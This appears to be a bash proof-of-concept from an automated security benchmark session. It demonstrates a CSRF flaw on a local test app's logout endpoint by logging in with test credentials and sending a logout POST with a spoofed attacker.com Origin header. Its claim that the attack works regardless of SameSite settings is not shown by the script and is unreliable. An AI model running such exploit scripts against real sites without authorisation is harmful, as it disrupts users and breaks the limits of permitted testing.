#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by forcing logout via cross-origin POST request without CSRF token
# Target: ./repo
# Created: 2025-11-07T18:48:57.235Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# CSRF Vulnerability POC on Logout Endpoint
# This POC demonstrates that the /logout endpoint lacks CSRF protection
# and can be exploited to force users to log out

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] CSRF Vulnerability POC - Logout Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate a user to get a valid session
echo "[+] Step 1: Authenticating user to obtain session cookie"
AUTH_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "$TARGET_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "[+] Authentication response received"

# Get the username from the initial form
echo "[+] Step 2: Getting password form"
PASSWORD_FORM=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/password/test")

# Submit password
echo "[+] Step 3: Submitting password"
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST "$TARGET_URL/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test&user_id=1" > /dev/null

echo "[+] User authenticated successfully"
echo ""

# Verify user is logged in by accessing dashboard
echo "[+] Step 4: Verifying user is logged in"
DASHBOARD_CHECK=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/dashboard")
if echo "$DASHBOARD_CHECK" | grep -q "Dashboard"; then
    echo "[+] Confirmed: User is logged in (dashboard accessible)"
else
    echo "[-] Warning: Could not verify login state"
fi
echo ""

# Step 5: Test CSRF vulnerability by sending logout request WITHOUT CSRF token
echo "[+] Step 5: Testing CSRF vulnerability - Sending logout request without CSRF token"
echo "[*] Attack scenario: Attacker crafts malicious webpage that submits POST /logout"
echo "[*] When authenticated user visits the page, they will be logged out automatically"
echo ""

LOGOUT_RESPONSE=$(curl -s -i -b /tmp/cookies.txt \
  -X POST "$TARGET_URL/logout" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com/malicious" \
  -H "Origin: http://attacker.com")

echo "[*] CSRF Logout Response:"
echo "$LOGOUT_RESPONSE" | head -20
echo ""

# Extract HTTP status code
HTTP_STATUS=$(echo "$LOGOUT_RESPONSE" | grep "HTTP" | head -1)
echo "[*] HTTP Status: $HTTP_STATUS"
echo ""

# Step 6: Verify logout was successful
echo "[+] Step 6: Verifying logout was successful"
AFTER_LOGOUT=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/dashboard")

if echo "$AFTER_LOGOUT" | grep -q "redirect\|login\|Login"; then
    echo "[✓] VULNERABILITY CONFIRMED: User was logged out via CSRF attack"
    echo "[✓] The endpoint accepted logout request without CSRF token validation"
    echo "[✓] Request from attacker's domain was not blocked"
else
    echo "[!] Logout may have been successful but response unclear"
fi

echo ""
echo "[*] POC Summary:"
echo "    - Logout endpoint does not require CSRF tokens"
echo "    - No validation of request origin"
echo "    - Attackers can force logout via malicious webpages"
echo "    - Attack is effective regardless of SameSite cookie settings"

# Cleanup
rm -f /tmp/cookies.txt